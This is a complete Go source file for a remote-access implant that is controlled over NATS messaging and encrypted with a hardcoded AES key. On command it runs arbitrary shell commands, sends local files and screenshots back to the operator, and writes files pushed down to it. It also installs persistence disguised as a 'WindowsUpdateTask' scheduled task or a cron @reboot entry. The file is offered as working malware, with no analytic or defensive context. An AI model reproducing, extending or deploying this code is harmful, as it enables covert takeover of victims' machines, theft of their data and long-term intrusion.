package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "io"
    "os"
    "os/exec"
    "path/filepath"
    "runtime"
    "strings"
    "time"

    "github.com/nats-io/nats.go"
    "github.com/go-vgo/robotgo"
)

// ------------------------- CONFIGURATION -------------------------
var natsServers = []string{
    "nats://localhost:4222",  // Change to your server IP
}

// AES key from generate_key.go
const b64Key = "rAEUBb5Id9HO3m3BZ+G5PSqBaceVJly4lbjbSSImz+c="

var aesKey []byte
var agentID string
const credsFile = "implant.creds"

// ------------------------- CRYPTO -------------------------
func encrypt(plaintext []byte) ([]byte, error) {
    block, err := aes.NewCipher(aesKey)
    if err != nil {
        return nil, err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    nonce := make([]byte, gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return nil, err
    }
    ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
    return ciphertext, nil
}

func decrypt(ciphertext []byte) ([]byte, error) {
    block, err := aes.NewCipher(aesKey)
    if err != nil {
        return nil, err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    nonceSize := gcm.NonceSize()
    if len(ciphertext) < nonceSize {
        return nil, fmt.Errorf("ciphertext too short")
    }
    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
    return gcm.Open(nil, nonce, ciphertext, nil)
}

// ------------------------- COMMAND EXECUTION -------------------------
func runCommand(cmdStr string) string {
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/C", cmdStr)
    } else {
        cmd = exec.Command("/bin/sh", "-c", cmdStr)
    }
    out, err := cmd.CombinedOutput()
    if err != nil {
        return fmt.Sprintf("Error: %v\nOutput: %s", err, string(out))
    }
    return string(out)
}

// ------------------------- FILE OPERATIONS -------------------------
func uploadFile(nc *nats.Conn, agentID, localPath string) {
    data, err := os.ReadFile(localPath)
    if err != nil {
        publishResult(nc, agentID, fmt.Sprintf("Upload error: %v", err))
        return
    }
    encData, err := encrypt(data)
    if err != nil {
        publishResult(nc, agentID, fmt.Sprintf("Encryption error: %v", err))
        return
    }
    b64enc := base64.StdEncoding.EncodeToString(encData)
    nc.Publish("c2."+agentID+".file_upload", []byte(b64enc))
    publishResult(nc, agentID, fmt.Sprintf("Uploaded %s (%d bytes)", localPath, len(data)))
}

func downloadFile(nc *nats.Conn, agentID, remotePath, b64Content string) {
    encData, err := base64.StdEncoding.DecodeString(b64Content)
    if err != nil {
        publishResult(nc, agentID, fmt.Sprintf("Base64 decode error: %v", err))
        return
    }
    data, err := decrypt(encData)
    if err != nil {
        publishResult(nc, agentID, fmt.Sprintf("Decryption error: %v", err))
        return
    }
    if err := os.WriteFile(remotePath, data, 0644); err != nil {
        publishResult(nc, agentID, fmt.Sprintf("Write error: %v", err))
        return
    }
    publishResult(nc, agentID, fmt.Sprintf("Downloaded to %s (%d bytes)", remotePath, len(data)))
}

// ------------------------- SCREENSHOT -------------------------
func takeScreenshot(nc *nats.Conn, agentID string) {
    bitmap := robotgo.CaptureScreen()
    defer bitmap.Free()
    img := robotgo.ToImage(bitmap)
    tmpFile := filepath.Join(os.TempDir(), "screenshot.png")
    robotgo.Save(img, tmpFile)
    uploadFile(nc, agentID, tmpFile)
    os.Remove(tmpFile)
}

// ------------------------- PERSISTENCE -------------------------
func installPersistence() {
    exePath, _ := os.Executable()
    if runtime.GOOS == "windows" {
        cmd := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateTask", "/tr", exePath, "/sc", "onlogon", "/f")
        cmd.Run()
    } else {
        cmd := exec.Command("crontab", "-l")
        out, _ := cmd.Output()
        newCron := string(out) + "@reboot " + exePath + " >/dev/null 2>&1\n"
        cmd2 := exec.Command("crontab", "-")
        cmd2.Stdin = strings.NewReader(newCron)
        cmd2.Run()
    }
}

// ------------------------- NATS COMMUNICATION -------------------------
func publishResult(nc *nats.Conn, agentID, msg string) {
    encMsg, _ := encrypt([]byte(msg))
    nc.Publish("c2."+agentID+".results", encMsg)
}

func heartbeat(nc *nats.Conn, agentID string) {
    encHeart, _ := encrypt([]byte("online"))
    nc.Publish("c2."+agentID+".heartbeat", encHeart)
}

func connectWithRetries() *nats.Conn {
    for {
        for _, url := range natsServers {
            // Try JWT auth first if creds file exists
            var nc *nats.Conn
            var err error
            
            if _, err := os.Stat(credsFile); err == nil {
                nc, err = nats.Connect(url, nats.UserCredentials(credsFile), nats.Timeout(5*time.Second))
            } else {
                // Fall back to no auth for testing
                nc, err = nats.Connect(url, nats.Timeout(5*time.Second))
            }
            
            if err == nil {
                fmt.Println("Connected to", url)
                return nc
            }
            fmt.Printf("Failed %s: %v\n", url, err)
        }
        fmt.Println("All servers failed, retrying in 10s...")
        time.Sleep(10 * time.Second)
    }
}

func main() {
    var err error
    aesKey, err = base64.StdEncoding.DecodeString(b64Key)
    if err != nil {
        panic(err)
    }
    
    hostname, _ := os.Hostname()
    agentID = fmt.Sprintf("%s-%d", hostname, os.Getpid())
    
    fmt.Println("Agent starting with ID:", agentID)
    
    nc := connectWithRetries()
    defer nc.Drain()

    // Subscribe to commands
    subj := "c2." + agentID + ".tasks"
    nc.Subscribe(subj, func(msg *nats.Msg) {
        cmdBytes, err := decrypt(msg.Data)
        if err != nil {
            publishResult(nc, agentID, "Decryption failed")
            return
        }
        cmd := string(cmdBytes)
        parts := strings.SplitN(cmd, " ", 2)
        verb := parts[0]
        arg := ""
        if len(parts) > 1 {
            arg = parts[1]
        }

        switch verb {
        case "exit":
            publishResult(nc, agentID, "Exiting")
            nc.Drain()
            os.Exit(0)
        case "shell":
            out := runCommand(arg)
            publishResult(nc, agentID, out)
        case "upload":
            uploadFile(nc, agentID, arg)
        case "download":
            subparts := strings.SplitN(arg, " ", 2)
            if len(subparts) == 2 {
                downloadFile(nc, agentID, subparts[0], subparts[1])
            } else {
                publishResult(nc, agentID, "Usage: download <path> <base64data>")
            }
        case "persist":
            installPersistence()
            publishResult(nc, agentID, "Persistence installed")
        case "screenshot":
            takeScreenshot(nc, agentID)
        default:
            publishResult(nc, agentID, "Unknown command: "+verb)
        }
    })

    heartbeat(nc, agentID)
    fmt.Println("Agent ready, waiting for commands...")

    for {
        time.Sleep(30 * time.Second)
        heartbeat(nc, agentID)
    }
}
